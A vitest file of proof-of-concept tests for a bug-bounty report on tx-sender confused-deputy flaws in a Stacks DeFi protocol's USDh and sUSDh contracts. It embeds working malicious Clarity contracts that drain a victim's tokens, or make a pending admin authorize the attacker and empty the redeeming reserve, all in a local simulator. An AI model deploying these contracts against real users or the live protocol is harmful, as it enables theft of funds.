// SPDX-License-Identifier: BUSL-1.1
// Security validation PoCs for the tx-sender confused-deputy findings.
//
// These tests prove the contract mechanics. They intentionally require the
// victim/pending-admin to invoke an attacker-controlled contract, which is a
// material bounty-scope/precondition caveat even though the nested-call paths
// are technically real.

import { describe, it, expect } from 'vitest';
import { Cl } from '@stacks/transactions';

const BASE = 100_000_000n;

function expectOk(result: any) {
  expect(result.result.type).toBe('ok');
}

function expectOkTrue(result: any) {
  expect(result.result).toBeOk(Cl.bool(true));
}

describe('tx-sender confused-deputy validation', () => {
  it('a called contract can transfer both USDh and sUSDh from tx-sender without allowance', () => {
    const accounts = simnet.getAccounts();
    const deployer = accounts.get('deployer')!;
    const trader = accounts.get('wallet_1')!;
    const attacker = accounts.get('wallet_2')!;
    const victim = accounts.get('wallet_3')!;
    const c = (name: string) => `${deployer}.${name}`;

    // Local funding setup only. Deployer is the initial HQ admin.
    expectOkTrue(simnet.callPublicFn(
      c('hq'),
      'set-contract-active',
      [Cl.principal(deployer), Cl.bool(true)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-state'),
      'set-whitelist-enabled',
      [Cl.bool(false)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'set-trader',
      [Cl.principal(trader), Cl.bool(true), Cl.bool(false)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'confirm-mint',
      [
        Cl.stringAscii('victim-fund'),
        Cl.principal(victim),
        Cl.uint(200n * BASE),
        Cl.uint(BASE),
      ],
      trader,
    ));

    // Give victim 100 sUSDh and leave 100 USDh liquid.
    expectOkTrue(simnet.callPublicFn(
      c('staking'),
      'stake',
      [Cl.uint(100n * BASE), Cl.none()],
      victim,
    ));

    const evilSource = `
      (define-public (steal-both (usdh-amount uint) (susdh-amount uint) (recipient principal))
        (begin
          ;; tx-sender is still the victim who called this contract.
          (try! (contract-call? '${deployer}.usdh-token transfer usdh-amount tx-sender recipient none))
          (try! (contract-call? '${deployer}.susdh-token transfer susdh-amount tx-sender recipient none))
          (ok true)))
    `;
    simnet.deployContract('evil-token-router', evilSource, { clarityVersion: 2 }, attacker);
    const evil = `${attacker}.evil-token-router`;

    // The victim calls only evil-token-router. There is no token approval and
    // the victim never calls either token contract directly.
    const stolen = simnet.callPublicFn(
      evil,
      'steal-both',
      [Cl.uint(100n * BASE), Cl.uint(100n * BASE), Cl.principal(attacker)],
      victim,
    );
    expectOkTrue(stolen);

    const victimUsdh = simnet.callReadOnlyFn(c('usdh-token'), 'get-balance', [Cl.principal(victim)], victim);
    const victimSusdh = simnet.callReadOnlyFn(c('susdh-token'), 'get-balance', [Cl.principal(victim)], victim);
    const attackerUsdh = simnet.callReadOnlyFn(c('usdh-token'), 'get-balance', [Cl.principal(attacker)], attacker);
    const attackerSusdh = simnet.callReadOnlyFn(c('susdh-token'), 'get-balance', [Cl.principal(attacker)], attacker);

    expect(victimUsdh.result).toBeOk(Cl.uint(0n));
    expect(victimSusdh.result).toBeOk(Cl.uint(0n));
    expect(attackerUsdh.result).toBeOk(Cl.uint(100n * BASE));
    expect(attackerSusdh.result).toBeOk(Cl.uint(100n * BASE));
  });

  it('a pending admin calling a contract can activate itself, authorize that contract, and drain redeeming-reserve', () => {
    const accounts = simnet.getAccounts();
    const deployer = accounts.get('deployer')!;
    const trader = accounts.get('wallet_1')!;
    const attacker = accounts.get('wallet_2')!;
    const pendingAdmin = accounts.get('wallet_3')!;
    const c = (name: string) => `${deployer}.${name}`;
    const redeemingReserve = c('redeeming-reserve');

    // Local funding setup only.
    expectOkTrue(simnet.callPublicFn(
      c('hq'),
      'set-contract-active',
      [Cl.principal(deployer), Cl.bool(true)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-state'),
      'set-whitelist-enabled',
      [Cl.bool(false)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'set-trader',
      [Cl.principal(trader), Cl.bool(true), Cl.bool(false)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'confirm-mint',
      [
        Cl.stringAscii('reserve-fund'),
        Cl.principal(deployer),
        Cl.uint(1_000n * BASE),
        Cl.uint(BASE),
      ],
      trader,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('usdh-token'),
      'transfer',
      [
        Cl.uint(1_000n * BASE),
        Cl.principal(deployer),
        Cl.principal(redeemingReserve),
        Cl.none(),
      ],
      deployer,
    ));

    const evilSource = `
      (define-public (activate-authorize-and-drain (amount uint) (recipient principal))
        (begin
          ;; The pending admin is tx-sender even though this contract is the
          ;; immediate caller of HQ.
          (try! (contract-call? '${deployer}.hq activate-admin tx-sender))

          ;; set-contract-active also authenticates the preserved tx-sender,
          ;; so the newly activated admin can unknowingly authorize this
          ;; malicious contract in the same transaction.
          (try! (contract-call? '${deployer}.hq set-contract-active current-contract true))

          ;; redeeming-reserve trusts active protocol contract-caller values.
          ;; Once this contract is active, the manager recipient restriction is
          ;; bypassed and reserve assets can be sent to an arbitrary recipient.
          (contract-call? '${deployer}.redeeming-reserve transfer
            amount
            recipient
            '${deployer}.usdh-token
            none)))
    `;
    simnet.deployContract('evil-admin-router', evilSource, { clarityVersion: 2 }, attacker);
    const evil = `${attacker}.evil-admin-router`;

    // Owner only nominates the future admin. This part is legitimate.
    expectOkTrue(simnet.callPublicFn(
      c('hq'),
      'request-admin-update',
      [Cl.principal(pendingAdmin)],
      deployer,
    ));

    // USDh HQ activation delay is 1008 burn blocks. Mine past it.
    simnet.mineEmptyBlocks(1_010);

    // The pending admin invokes only the attacker contract; it performs the
    // admin activation + self-authorization + reserve withdrawal as nested calls.
    const drained = simnet.callPublicFn(
      evil,
      'activate-authorize-and-drain',
      [Cl.uint(1_000n * BASE), Cl.principal(attacker)],
      pendingAdmin,
    );
    expectOk(drained);

    const adminState = simnet.callReadOnlyFn(c('hq'), 'get-admin', [Cl.principal(pendingAdmin)], deployer);
    const evilActive = simnet.callReadOnlyFn(c('hq'), 'get-contract-active', [Cl.principal(evil)], deployer);
    const reserveBalance = simnet.callReadOnlyFn(c('usdh-token'), 'get-balance', [Cl.principal(redeemingReserve)], deployer);
    const attackerBalance = simnet.callReadOnlyFn(c('usdh-token'), 'get-balance', [Cl.principal(attacker)], attacker);

    // Avoid depending on tuple decoding for adminState; the economically
    // relevant consequences below require activation to have succeeded.
    expect(adminState.result.type).toBe('ok');
    expect(evilActive.result).toBeBool(true);
    expect(reserveBalance.result).toBeOk(Cl.uint(0n));
    expect(attackerBalance.result).toBeOk(Cl.uint(1_000n * BASE));
  });
});
